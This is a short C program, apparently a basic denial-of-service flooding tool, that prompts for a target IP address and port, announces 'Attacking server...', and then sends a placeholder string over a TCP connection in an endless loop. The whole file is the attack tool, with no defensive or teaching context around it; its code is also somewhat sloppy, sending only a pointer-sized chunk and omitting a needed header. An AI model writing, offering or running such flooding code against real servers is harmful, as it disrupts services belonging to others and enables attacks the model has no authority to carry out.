#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <time.h>

void attack_target(char *ip, int port) {
    int sock;
    struct sockaddr_in server_addr;
    socklen_t addr_len = sizeof(server_addr);

    // Create a socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "Socket creation failed...\n");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    // Connect the socket to the target server
    if (connect(sock, (struct sockaddr *)&server_addr, addr_len) < 0) {
        fprintf(stderr, "Connection failed...\n");
        exit(1);
    }

    // Send data repeatedly
    char *data = "Your data here";
    while (1) {
        if (send(sock, data, sizeof(data), 0) < 0) {
            fprintf(stderr, "Failed to send data...\n");
            break;
        }
    }

    // Close the socket
    close(sock);
}

int main() {
    char input_ip[32];
    int port;

    printf("Enter the target IP: ");
    fgets(input_ip, sizeof(input_ip), stdin);
    input_ip[strcspn(input_ip, "\n")] = '\0';

    printf("Enter the port number: ");
    scanf("%d", &port);

    printf("Target IP: %s\n", input_ip);
    printf("Port: %d\n", port);
    printf("Attacking server...\n");

    attack_target(input_ip, port);

    return 0;
}
